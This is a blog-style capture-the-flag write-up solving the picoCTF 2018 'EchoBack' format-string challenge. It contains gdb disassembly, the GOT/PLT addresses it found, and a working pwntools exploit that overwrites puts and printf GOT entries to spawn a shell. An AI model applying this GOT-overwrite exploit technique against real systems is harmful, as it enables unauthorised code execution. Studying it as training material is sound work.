# Echoback
Hello everyone, after working on the challenges of Pico CTF 2018 for a while, I came across a question called EchoBack, about which there were many solutions, and some of which were very difficult for beginners. I will solve it in the simplest way possible.


**Let's Start**

This program we found seems to have a vulnerability. Can you get a shell and retreive the flag? Connect to it with `nc 2018shell2.picoctf.com 37857`

In this post, I used the echo back file, but you can use it remotely and using NetCat.

```
#include <stdint.h>

int32_t vuln (void) {
    char * format;
    int32_t canary;
    int32_t local_4h;
    eax = *(gs:0x14);
    canary = eax;
    eax = 0;
    edx = &format;
    eax = 0;
    ecx = 0x20;
    edi = edx;
    do {
        *(es:edi) = eax;
        ecx--;
        es:edi += 4;
    } while (ecx != 0);
    system ("echo input your message:", edi);
    eax = &format;
    read (0, eax, 0x7f);
    eax = &format;
    printf (eax);
    puts (0x8048739);
    puts ("Thanks for sending the message!");
    eax = canary;
    eax ^= *(gs:0x14);
    if (? != ?) {
        _stack_chk_fail ();
    }
    edi = local_4h;
    return eax;
}
```
If you are careful in the above code, it takes 0x7f from the user and displays it using PrintF, and also if you are careful,the program uses system from libc which saves us the trouble of leaking the libc base address.

Well, we have two challenges here

1-  we need to overwrite the puts GOT entry in order for the program to loop allowing us to abuse the format string vulnerability more than once.
2-  we need to replace the printf GOT entry with the PLT address of system which will give us a shell. If both steps are executed correctly, we can then retrieve the flag.

**Tips**

we can only write four bytes with no integer overflow because the system GOT entry is right after and we need that


now we need to find puts@got , vuln function address , system@plt and printf@got but how can do it ???

you can use many tools like (radare2 , pwndbg , gdb , pwntools) that i want to use gdb 

```
gdb-peda$ set disassembly-flavor intel
gdb-peda$ b *vuln
Breakpoint 1 at 0x80485ab
gdb-peda$ r

gdb-peda$ disas vuln
Dump of assembler code for function vuln:
=> 0x080485ab <+0>:     push   ebp
   0x080485ac <+1>:     mov    ebp,esp
   0x080485ae <+3>:     push   edi
   0x080485af <+4>:     sub    esp,0x94
   0x080485b5 <+10>:    mov    eax,gs:0x14
   0x080485bb <+16>:    mov    DWORD PTR [ebp-0xc],eax
   0x080485be <+19>:    xor    eax,eax
   0x080485c0 <+21>:    lea    edx,[ebp-0x8c]
   0x080485c6 <+27>:    mov    eax,0x0
   0x080485cb <+32>:    mov    ecx,0x20
   0x080485d0 <+37>:    mov    edi,edx
   0x080485d2 <+39>:    rep stos DWORD PTR es:[edi],eax
   0x080485d4 <+41>:    sub    esp,0xc
   0x080485d7 <+44>:    push   0x8048720 
   0x080485dc <+49>:    call   0x8048460 <system@plt>
   0x080485e1 <+54>:    add    esp,0x10
   0x080485e4 <+57>:    sub    esp,0x4
   ```
  **0x080485e7 <+60>:    push   0x7f**
  ```
   0x080485e9 <+62>:    lea    eax,[ebp-0x8c]
   0x080485ef <+68>:    push   eax
   0x080485f0 <+69>:    push   0x0
   0x080485f2 <+71>:    call   0x8048410 <read@plt>
   0x080485f7 <+76>:    add    esp,0x10
   0x080485fa <+79>:    sub    esp,0xc
   0x080485fd <+82>:    lea    eax,[ebp-0x8c]
   0x08048603 <+88>:    push   eax
   0x08048604 <+89>:    call   0x8048420 <printf@plt>
   0x08048609 <+94>:    add    esp,0x10
   0x0804860c <+97>:    sub    esp,0xc
   0x0804860f <+100>:   push   0x8048739
   0x08048614 <+105>:   call   0x8048450 <puts@plt>
   0x08048619 <+110>:   add    esp,0x10
   0x0804861c <+113>:   sub    esp,0xc
   0x0804861f <+116>:   push   0x804873c
   0x08048624 <+121>:   call   0x8048450 <puts@plt>
   0x08048629 <+126>:   add    esp,0x10
   0x0804862c <+129>:   nop
   0x0804862d <+130>:   mov    eax,DWORD PTR [ebp-0xc]
   0x08048630 <+133>:   xor    eax,DWORD PTR gs:0x14
   0x08048637 <+140>:   je     0x804863e <vuln+147>
   0x08048639 <+142>:   call   0x8048430 <__stack_chk_fail@plt>
   0x0804863e <+147>:   mov    edi,DWORD PTR [ebp-0x4]
   0x08048641 <+150>:   leave  
   0x08048642 <+151>:   ret 
   ```
As described above, the value 0x7f is taken from the user and read using Printf  

Now Let's go to find Others (System@plt , puts@got , printf@got)

**call   0x8048460 <system@plt>** (system@plt)
```
gdb-peda$ disassemble /m 0x8048450 
Dump of assembler code for function puts@plt:
   0x08048450 <+0>:     jmp    DWORD PTR ds: 0x804a01c
   0x08048456 <+6>:     push   0x20
   0x0804845b <+11>:    jmp    0x8048400
End of assembler dump.


gdb-peda$ disassemble /m 0x8048420
Dump of assembler code for function printf@plt:
   0x08048420 <+0>:     jmp    DWORD PTR ds:0x804a010
   0x08048426 <+6>:     push   0x8
   0x0804842b <+11>:    jmp    0x8048400
End of assembler dump.
```

Well now we have everythings 

**system = 0x08048460**

**puts = 0x804a01c**

**printf = 0x804a010**

**vuln = 0x080485e7**

Now let's Start to exploit it 
```
┌──(root💀Amirali)-[~]
└─# touch exploit.py #Added 

from pwn import *

elf = ELF('./echoback')
#sh = remote('2018shell2.picoctf.com', 37857')
sh = process('./echoback')
system = 0x08048460
puts = 0x804a01c
printf = 0x804a010
vuln = 0x080485e7
payload = fmtstr_payload(7, {puts: vuln, printf: system})
sh.sendline(payload)
sh.sendline("/bin/sh")
sh.interactive() 
```
Finish :) 

Thank you for arranging your feedback and suggestions with me before consulting with me !!!

